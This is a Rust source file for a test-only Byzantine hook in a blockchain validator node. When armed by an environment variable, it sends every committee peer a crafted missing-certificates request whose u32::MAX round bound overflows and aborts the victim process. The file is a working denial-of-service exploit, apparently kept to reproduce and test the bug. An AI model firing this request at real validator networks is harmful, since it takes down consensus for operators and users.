//! Test-only Byzantine hook: crash remote validators with a crafted missing-certificates request.
//!
//! Compiled only with the `byzantine-test-hooks` feature, never in a production build. When
//! armed by environment, a node sends a single `MissingCertificatesRequest` with
//! `exclusive_lower_bound = u32::MAX` and one authority carrying an empty roaring skip bitmap to
//! every committee peer. On the victim, `next_round_number` computes `round + 1` which overflows
//! `Round` (u32). Release builds (`overflow-checks = true` + `panic = "abort"`) abort the process.
//!
//! Armed per process by environment:
//!
//!   `RL_ROUND_OVERFLOW_ATTACK=1`   enable the hook (inert otherwise)
//!   `RL_ROUND_OVERFLOW_DELAY=<s>`  seconds to wait after startup before firing (default 20)

use crate::network::{MissingCertificatesRequest, PrimaryNetworkHandle};
use rayls_infrastructure_types::{AuthorityIdentifier, Committee};

pub(crate) fn maybe_spawn_attack(
    network: PrimaryNetworkHandle,
    committee: Committee,
    authority_id: Option<AuthorityIdentifier>,
    task_manager: &rayls_infrastructure_types::TaskManager,
) {
    if std::env::var("RL_ROUND_OVERFLOW_ATTACK").is_err() {
        return;
    }

    let delay_secs: u64 = std::env::var("RL_ROUND_OVERFLOW_DELAY")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(20);

    task_manager.spawn_task("round-overflow-attack", async move {
        tokio::time::sleep(std::time::Duration::from_secs(delay_secs)).await;

        let peers = committee.others_primaries_by_id(authority_id.as_ref());
        if peers.is_empty() {
            tracing::error!(target: "round-overflow-attack", "no committee peers to attack");
            return;
        }

        let mut empty_bitmap = Vec::new();
        roaring::RoaringBitmap::new()
            .serialize_into(&mut empty_bitmap)
            .expect("serialize empty roaring bitmap");

        tracing::error!(
            target: "round-overflow-attack",
            count = peers.len(),
            "sending max-round empty-skip MissingCertificates to all committee peers"
        );

        let mut handles = Vec::new();
        for (victim_id, victim_key) in peers {
            let net = network.clone();
            let bm = empty_bitmap.clone();
            handles.push(tokio::spawn(async move {
                let request = MissingCertificatesRequest {
                    exclusive_lower_bound: u32::MAX,
                    skip_rounds: vec![(victim_id.clone(), bm)],
                    max_response_size: 1_000,
                    exclusive_upper_bound: None,
                };
                tracing::error!(
                    target: "round-overflow-attack",
                    %victim_id, %victim_key,
                    "sending crafted request"
                );
                let res = net.fetch_certificates(victim_key, request).await;
                tracing::error!(
                    target: "round-overflow-attack",
                    %victim_id, ?res,
                    "request returned (victim should have aborted)"
                );
            }));
        }
        for h in handles {
            let _ = h.await;
        }
    });
}
